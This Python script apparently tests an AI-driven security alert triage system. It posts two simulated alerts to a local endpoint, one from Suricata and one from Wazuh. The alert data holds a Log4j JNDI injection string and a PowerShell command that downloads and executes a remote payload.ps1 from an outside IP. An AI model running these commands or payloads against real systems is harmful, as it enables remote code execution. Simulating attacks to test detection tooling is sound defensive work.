import requests
import time
from datetime import datetime, timezone

def run_simulation():
    print("🚀 Triggering PhD-Level Multi-Stage Attack Simulation (Log4j + PowerShell)...")
    
    # 1. SECURITY ONION ALERT: Log4j Exploit
    suricata_alert = {
        "source_system": "suricata",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "original_data": {
            "alert": {
                "severity": 1,
                "signature": "ET EXPLOIT Apache log4j RCE Attempt (http jndi:ldap)",
                "category": "Attempted Administrator Privilege Gain"
            },
            "src_ip": "45.33.32.156", 
            "dest_ip": "10.0.12.50",
            "app_proto": "http",
            "full_log": (
                "SECURITY ONION: Inbound HTTP POST request containing malicious JNDI lookup string: "
                "${jndi:ldap://45.33.32.156:1389/Exploit} in the User-Agent header targeting Nginx reverse proxy."
            )
        }
    }

    # 2. WAZUH ALERT: Suspicious Child Process (Initial Access)
    wazuh_alert = {
        "source_system": "wazuh",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "original_data": {
            "rule": {
                "level": 12,
                "description": "Suspicious child process spawned by Java web application."
            },
            "srcip": "45.33.32.156",
            "dstip": "10.0.12.50", 
            "data": {
                "srcuser": "SYSTEM",
                "process": "powershell.exe",
                "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://45.33.32.156/payload.ps1')\""
            },
            "full_log": (
                "WAZUH HIDS (10.0.12.50): Java.exe spawned powershell.exe executing hidden encoded command to download payload.ps1. "
                "High probability of successful Remote Code Execution."
            )
        }
    }

    print("\n📦 Pushing [Security Onion] NIDS Alert (Log4j Exploit)...")
    try:
        requests.post("http://localhost:8001/api/v1/alerts/manual", json=suricata_alert, timeout=5)
    except Exception as e:
        print("❌ Error reaching the AI endpoint. IS DOCKER DESKTOP RUNNING?", e)
        return
        
    time.sleep(2)
        
    print("📦 Pushing [Wazuh] HIDS Alert (PowerShell Payload)...")
    try:
        requests.post("http://localhost:8001/api/v1/alerts/manual", json=wazuh_alert, timeout=5)
        print("\n🧠 LangGraph Reflective Engine is active:")
        print("   - Mapping CVE vulnerabilities...")
        print("   - Extracting exact MITRE T-Codes...")
        print("   - Critic Node is reviewing compliance...")
        print("⏳ Wait ~45 seconds, then check the Dashboard!")
    except Exception as e:
        print("❌ Error reaching the AI endpoint:", e)

if __name__ == "__main__":
    run_simulation()
